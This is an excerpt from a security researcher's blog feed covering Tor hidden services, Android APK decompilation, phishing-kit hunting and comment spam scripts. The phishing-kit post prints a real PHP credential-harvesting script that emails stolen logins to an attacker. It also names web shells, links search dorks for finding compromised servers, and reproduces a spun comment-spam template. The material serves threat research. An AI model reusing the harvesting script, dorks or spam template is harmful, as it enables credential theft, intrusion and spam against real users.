<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>C:\&gt;python tor_example.py
</span><span class='line'> * Getting controller
</span><span class='line'> * Created host: 4yrbax6gwnemqh7n.onion
</span><span class='line'> * Running on http://127.0.0.1:5000/</span></code></pre></td></tr></table></div></figure>


<p><img src="http://jordan-wright.github.io/images/blog/hidden_services/screenshot.png"/></p>

<h3>Caveats</h3>

<p>It is important to note that the security of the hidden service depends on protecting the location of the server. To do this, consider ways to prevent leaking the real server IP through debug messages, etc. There has been some <a href="https://news.ycombinator.com/item?id=8404511">great discussion</a> on the topic that might be worth looking into.</p>

<h3>Conclusion</h3>

<p>Hidden services deliver freedom of speech and the free exchange of ideas without censorship. By using Stem Python library, it&rsquo;s possible to take the pain out of manual configuration and instead programmatically create and manage multiple hidden services.</p>

<p>As always, let me know if you have any questions or comments.</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Decompiling Android Apps the Easy Way]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/08/10/decompiling-android-apps-the-easy-way/"/>
    <updated>2014-08-10T19:51:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/08/10/decompiling-android-apps-the-easy-way</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/android_apps.png"/></p>

<h3>Introduction</h3>

<p>Mobile applications are often viewed as black-box applications. However, these applications often suffer from the same (or similar) vulnerabilities as their web application counterparts.</p>

<p>In a <a href="http://jordan-wright.github.io/blog/2013/11/07/how-to-pentest-iphone-apps-with-burp/">previous post</a>, I showed how we can perform dynamic analysis on iPhone applications by intercepting the inbound/outbound traffic with the Burp proxy. In this post, we&rsquo;ll explore static analysis of Android apps by looing at a couple of online tools that make decompiling apps into equivalent Java and Smali code trivial.</p>

<!-- more -->


<h3>Step One: Get the APK</h3>

<p>The first step in analyzing an Android app is to get the actual APK that&rsquo;s loaded onto the device. Fortunately, there is a site called <a href="http://apps.evozi.com/apk-downloader/">APK Downloader</a> which allows us to do just that. By getting the link to the app of your choice from the <a href="https://play.google.com/store/apps?hl=en">Google Play Store</a> and pasting it into APK Downloader, you can download a local copy of the app APK.</p>

<h3>Step Two: Unpack and Decompile</h3>

<p>After we have the APK, we need to unpack and decompile the contents into its equivalent Java code. This used to be a pretty lengthy process using tools such as the <a href="https://code.google.com/p/android-apktool/">android apktool</a>. Fortunately for us, someone has also setup a web-based service which automatically performs the decompilation process on a given APK.</p>

<p>By uploading the APK to <a href="http://www.decompileandroid.com/">decompileandroid.com</a>, the user will be presented with the option to download the decompiled contents of the app, including the Java source code. <em>Awesome.</em></p>

<h3>Things to Look For</h3>

<p>Decompiling Android apps can allow researchers to analyze the exact code that is running on the app for vulnerabilities, as well as reveal any hardcoded credentials or other sensitive data. For example, in June of 2014, researchers from Columbia university created a tool called <a href="https://github.com/nviennot/playdrone">PlayDrone</a> which automatically crawled thousands of Android apps found on the Google Play store and <a href="http://www.cs.columbia.edu/~nieh/pubs/sigmetrics2014_playdrone.pdf">discovered the existence of sensitive credentials</a> in many of them.</p>

<h3>Conclusion</h3>

<p>Hopefully this short post not only shows researchers how to easily decompile Android apps, but also sends a gentle reminder to app developers that the source code of the app can easily be recovered. As such, precautions should be taken to ensure there is no sensitive information &ldquo;hidden in plain sight&rdquo;. As always, leave any questions or comments below!</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Hunt Down Phishing Kits]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/07/30/how-to-hunt-down-phishing-kits/"/>
    <updated>2014-07-30T22:12:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/07/30/how-to-hunt-down-phishing-kits</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/phishing_kit.png"/></p>

<h3>Introduction</h3>

<p>Sites like <a href="http://www.phishtank.com/phish_archive.php">phishtank</a> and <a href="http://support.clean-mx.com/clean-mx/phishing.php">clean-mx</a> act as crowdsourced phishing detection and validation. By knowing how to look, you can consistently find <a href="http://jordan-wright.github.io/blog/2014/04/04/a-look-at-comment-spam-generator-scripts/">interesting information</a> about how attackers work, and the tools they use to conduct phishing campaigns. This post will give an example of how <em>phishing kits</em> are used, how to find them, as well as show a case study into other tools attackers use to maintain access to compromised servers.</p>

<!-- more -->


<h3>How Phishing Kits Work</h3>

<p>To perform a phishing attack, attackers commonly employ prebuilt <em>phishing kits</em>. These kits come as a zip archive containing the HTML source code of the site they are spoofing, as well as accompanying PHP scripts that capture and process the phished credentials. Once credentials are submitted from a victim, they are passed to a script that looks similar to this (real) example:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span> <span class="o">||</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">){</span>
</span><span class='line'>        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location:file_doc.php&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">exit</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nb">session_destroy</span><span class="p">();</span>
</span><span class='line'><span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span><span class='line'><span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$ip</span> <span class="o">=</span> <span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$country</span> <span class="o">=</span> <span class="nx">visitor_country</span><span class="p">();</span>
</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;-------Moded by Ghost Wir3 ----------</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;Username: &quot;</span><span class="o">.</span><span class="nv">$username</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;Password : &quot;</span><span class="o">.</span><span class="nv">$password</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;IP: &quot;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;Country: &quot;</span><span class="o">.</span><span class="nv">$country</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$recipient</span> <span class="o">=</span> <span class="s2">&quot;[redacted]@gmail.com&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$subject</span> <span class="o">=</span> <span class="s2">&quot;Ghost Wir3 - &quot;</span><span class="o">.</span><span class="nv">$country</span><span class="p">;</span>
</span><span class='line'><span class="nv">$headers</span> <span class="o">=</span> <span class="s2">&quot;From:  Ghost Wir3 &lt;no_reply@mail.com&gt;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$headers</span> <span class="o">.=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;eMailAdd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$headers</span> <span class="o">.=</span> <span class="s2">&quot;MIME-Version: 1.0</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$arr</span> <span class="o">=</span> <span class="nx">country_sort</span><span class="p">();</span>
</span><span class='line'><span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$recipient</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="nb">mail</span><span class="p">(</span><span class="nv">$recipient</span><span class="p">,</span><span class="nv">$subject</span><span class="p">,</span><span class="nv">$message</span><span class="p">,</span><span class="nv">$headers</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>In this example, to reuse the phishing kit, an attacker simply needs to change the <code>$recipient</code> variable to point to their address. In addition to this, if we as defenders are able to pull this PHP code, we can quickly identify the threat actor (in this case, [redacted]@gmail.com).</p>

<h3>How to Find Phishing Kits</h3>

<p>We&rsquo;ve seen that these kits generally require the credentials to be processed by server-side code. Unless there is a misconfiguration on the server, we will not be able to view this code, only that credentials are being passed to it.</p>

<p>However, with that being said, <em>many attackers are <strong>lazy</strong></em>. I&rsquo;ve seen from experience that the original zip file containing the phishing kit is often left on the server, and can be downloaded to reveal the server-side source code. Additionally, the directories hosting the phishing kits often have indexing enabled, making it easier for us to see the files in the directory. This same technique has also <a href="https://www.usenix.org/legacy/events/woot08/tech/full_papers/cova/cova.pdf">been used previously by researchers</a> with success.</p>

<p><img src="http://jordan-wright.github.io/images/blog/phish_kits/directory_index.png"/></p>

<p>Knowing this, we can send requests for common archive extensions automatically in the hopes of finding the original phishing kits. These extensions include things such as .zip, .tar, .tar.gz, and .rar. For example, if the URL found by phishtank or clean-mx is <a href="http://x.x.x.x/apple/index.php,">http://x.x.x.x/apple/index.php,</a> we could send requests for <a href="http://x.x.x.x/apple.zip">http://x.x.x.x/apple.zip</a> with success in many cases.</p>

<p>In some cases, finding the original phishing kit can reveal even more information about the tools and techniques used by attackers. Here&rsquo;s an example of one of those cases.</p>

<h3>A Look into a Compromised Website</h3>

<p>While performing random checks on many of the sites listed on phishtank and clean-mx, I came across one site that had a phishing kit located in the /phpmyadmin directory. When checking the files in the phishing kit, I found reference to a c100.php web shell. Sure enough, this file was still in place on the server:</p>

<p><img src="http://jordan-wright.github.io/images/blog/phish_kits/c100.png" /></p>

<p>PHP backdoors provide substantial access to attackers, facilitating further attacks and control over the compromised server. The c100.php and c99.php backdoors are among the most popular backdoors used by attackers. Through some Googling, we can see that there are <strong>tons</strong> of servers that are compromised using <a href="https://www.google.com/search?q=inurl%3A%22c99.php%22%22AND+filetype%3Aphp+%22!C99Shell%22+AND+%22Software%22">these</a> <a href="https://www.google.com/search?q=inurl%3A%22c100.php%22%22AND+filetype%3Aphp+%22%21C100%22+AND+%22Software%22">shells</a>.</p>

<p>This shell revealed additional scripts (and other webshells) used by the attacker, including (but certainly not limited to!) the following:</p>

<ul>
<li><a href="https://gist.github.com/jordan-wright/966cea37b8c01c360a2a#file-valider-php">valider.php</a> &ndash; The credential caching script</li>
<li><a href="https://gist.github.com/jordan-wright/966cea37b8c01c360a2a#file-wpbrute-php">wpbrute.php</a> &ndash; A Wordpress brute forcing script</li>
<li><a href="https://gist.github.com/jordan-wright/966cea37b8c01c360a2a#file-wso-php">wso.php</a> &ndash; Another web shell</li>
</ul>


<h3>Fellow Phish Hunters</h3>

<p>In the process of pulling down additional scripts used by the attacker, I ran across the site access logs. Looking through this log, I could see the details of what files the attacker was accessing on the server, as well as determine that these files were in place as early as July 27, 2014. In addition to this, I found the following snippet:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">44</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/tardis.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">428</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">44</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/tardis.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">435</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/paypal.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">435</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/wellsfargo.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">439</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/chase.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">434</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/boa.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">432</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/update.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">435</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/pp.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">431</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/wells.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">434</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/remax.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">434</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">46</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/paypal.com.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">439</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">46</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/us.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">431</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">47</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/www.paypal.com.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">443</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">47</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/bankofamerica.com.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">446</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can see that someone has a Java bot that is performing the same technique I described above, by automatically sending requests for common phishing kits. In fact, this and another bot submitted a <strong>substantial</strong> number of requests for common files to be found on phishing kits. I&rsquo;ll likely parse these out and make another blog post with the full list for those interested.</p>

<h3>Conclusion</h3>

<p>Hopefully this post not only shows a few of the interesting pieces of information we can find when investigating servers used for phishing campaigns, but also that there is still an incredible amount of work to be done in identifying threat actors behind phishing campaigns. As always, let me know if you have any questions or comments below!</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[A Look at Comment Spam Generator Scripts]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/04/04/a-look-at-comment-spam-generator-scripts/"/>
    <updated>2014-04-04T14:33:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/04/04/a-look-at-comment-spam-generator-scripts</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/spam_gen.png"/></p>

<h3>Introduction</h3>

<p>It&rsquo;s been a while! I&rsquo;ve been busy getting <a href="http://github.com/jordan-wright/gophish">gophish</a> closer and closer to beta. Should be ready soon!</p>

<p>Until then, here&rsquo;s a quick look at some comment spam scripts I discovered when perusing through the content over at <a href="http://phishtank.com">phishtank.com</a>.</p>

<p><em>As a side note, the scripts were bundled as some Louis Vuitton spam, though that doesn&rsquo;t seem to relate to the content of the spam scripts at all.</em></p>

<h3>The Spam Scripts</h3>

<p>Here are the scripts &ndash; the format looks very similar to <a href="http://alexking.org/blog/2013/12/22/spam-comment-generator-script">those found by Alex King</a>. I&rsquo;m guessing that one choice from each <code>{block}</code> is used at random to make every comment unique.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>{Rapper|Rap artist|Artist} {George|Henry} Watsky apologises {for|with regard to|regarding|pertaining to} {breaking|busting|splitting|smashing} {woman|lady|girl|female}
</span><span class='line'>{The|The actual|The particular|Your} {rapper|rap artist|artist} {was|had been|has been|ended up being} {performing|carrying out|executing|undertaking} {at|from|with|in} Alexandra {Palace|Structure|Construction|Development} {in|within|inside|throughout} {north|northern|n .|upper} {London|Birmingham|Greater london|Manchester} {when he|as he|while he|whilst} {climbed|rose|risen|soared} {up the|in the|the|inside the} {stage|phase|period|point} {on a|on the|over a|with a} {rope|string|piece of string|line} {before|prior to|just before|ahead of} {launching|starting|introducing|establishing} {himself|themself|themselves|herself} {onto the|to the|on the|on top of the} {audience|target audience|viewers|market} {from|through|coming from|via} 30ft.
</span><span class='line'>{In a|Inside a|In the|Within a} {lengthy|extended|prolonged|long} {post|publish|submit|article} {on|upon|about|in} {his|their|his / her|his or her} {Facebook|Fb|Myspace|Facebook or myspace} {page|web page|site|web site}, Watsky apologised {for|with regard to|regarding|pertaining to} {his|their|his / her|his or her} {stunt|stop|trick} {and|as well as|and also|along with} {said|stated|mentioned|explained} {he|he or she|this individual|they} {decided to|chose to|made a decision to|thought we would} {jump|leap|hop|bounce} {due to a|as a result of|because of a|because of} "huge overreach {in the|within the|inside the|from the} {heat|warmth|temperature|high temperature} {of the|from the|with the|in the} moment".
</span><span class='line'>{He said|He explained|He was quoted saying|He stated}: "The {jump|leap|hop|bounce} {was not|wasn't|had not been|has not been} {awesome|amazing|great|wonderful}, {it was not|it wasn't|it had not been} badass, {and it|also it|plus it|and yes it} {was not|wasn't|had not been|has not been} ballsy. {It|This|That|The idea} {turned|switched|flipped|transformed} {what|exactly what|just what|precisely what} {should have|must have|needs to have|really should have} {been|already been|recently been|been recently} {a great|an excellent|a fantastic|an incredible} {day|day time|evening|morning} {for the people|for anyone|for those|for people} {who|that|which|whom} {got|obtained|received|acquired} {hurt|harm|damage|injure} {into a|right into a|in to a|in a} {nightmare|headache|problem|pain}. {It was|It had been|It absolutely was|It turned out} {stupid|silly|foolish|ridiculous} {and|as well as|and also|along with} {wildly|extremely|hugely|very} {irresponsible|reckless|uncaring|freewheeling}, {plain and simple|basically|in basic terms|simply}.
</span><span class='line'>"I {pride|satisfaction|delight|pleasure} {myself|personally|me personally|myself personally} {on|upon|about|in} {trying to|attempting to|wanting to|looking to} {put on|placed on|wear|place on} {a good|a great|an excellent|a fantastic} {show|display|present|demonstrate} {and always|and try to|and constantly|try to} {giving|providing|offering|supplying} {100|One hundred|A hundred|Hundred} {per cent|percent|%|per-cent} {energy|power|vitality|electricity}, {but|however|yet|nevertheless} {jumping|leaping|bouncing|moving} {off|away|away from|off of} {some|a few|several|a number of} {high|higher|large|substantial} {st|street|saint|e} {doesn't|does not|will not|won't} {make|help to make|help make|create} {someone|somebody|an individual|a person} {a good|a great|an excellent|a fantastic} {musician|music performer|artist|musician and performer} {or|or even|or perhaps|as well as} {performer|artist|musician|singer}. {I feel|Personally i think|I'm|I am} fing {terrible|horrible|awful|dreadful}. {I|We|My partner and i|My spouse and i} {made a|designed a|developed a|created a} boneheaded {decision|choice|selection|determination} {that|which|in which|that will} {got|obtained|received|acquired} {people|individuals|folks|men and women} {hurt|harm|damage|injure}, {and it's|and it is|and it's really|and} {extremely|very|really|incredibly} {lucky|fortunate|blessed|fortuitous} {it wasn't|it had not been|it was not} {worse|even worse|a whole lot worse|more serious}.{"|Inch|Inches|In .}
</span><span class='line'>{He|He or she|This individual|They} {added|additional|extra|included} {he|he or she|this individual|they} {was not|wasn't|had not been|has not been} {under the influence of|intoxicated by|consuming|ingesting} {drugs or alcohol|alcohol or drugs} {when he|as he|while he|whilst} {performed|carried out|done|executed} {the|the actual|the particular|your} {stunt|stop|trick}, {and|as well as|and also|along with} {said|stated|mentioned|explained} {his|their|his / her|his or her} {health|wellness|well being|wellbeing} {was|had been|has been|ended up being} "fine, {besides|apart from|in addition to|aside from} {some|a few|several|a number of} {nicks|grazes|dings|lacerations}, bruises, {and the|and also the|as well as the|along with the} {shame|pity|disgrace|waste} {of|associated with|regarding|involving} {endangering|risking|threatening} {the|the actual|the particular|your} crowd".
</span><span class='line'>{The|The actual|The particular|Your} {Californian|American} {rapper|rap artist|artist} {said|stated|mentioned|explained} {he had|he'd|he previously|he} {been to|visited|gone to|attended} {hospital|medical center|clinic|healthcare facility} {to visit|to go to|to see|to check out} {the two|the 2|both|both the} {audience|target audience|viewers|market} {members|people|associates|users} {who were|who have been|who had been|have been} {injured|hurt|wounded|harmed}, {and|as well as|and also|along with} {stayed|remained|stayed at|slept} {with them|together|using them|with these} {for|with regard to|regarding|pertaining to} {six hours|6 hours} {until the|before the|before|prior to the} {visiting|going to|browsing|traveling to} {period|time period|period of time|interval} {had|experienced|acquired|got} {ended|finished|concluded|broken}.
</span><span class='line'>{He|He or she|This individual|They} {confirmed|verified|established|validated} {he would|he'd|however|although} {not be|'t be|not|stop} {cancelling|rescheduling|deleting|closing} {his|their|his / her|his or her} {remaining|leftover|staying|outstanding} {six|6|half a dozen|six to eight} {tour|visit|excursion|trip} {dates|times|days|schedules} {in the UK|in the united kingdom|in britain|in england}.
